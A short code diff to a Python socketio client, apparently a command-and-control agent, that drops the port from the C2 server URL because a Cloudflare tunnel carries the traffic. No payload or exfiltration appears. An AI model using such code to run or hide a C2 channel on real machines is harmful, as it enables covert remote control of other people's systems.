@@ -3,8 +3,8 @@ import threading
 import socketio
 import time
 from config import C2_HOST, C2_PORT, MACHINE_ID
+C2_URL = C2_HOST  # port handled by Cloudflare tunnel, no need to append
 
-C2_URL = f"{C2_HOST}:{C2_PORT}"
 
 def make_client():
     """Create a fresh socketio client with event handlers registered."""
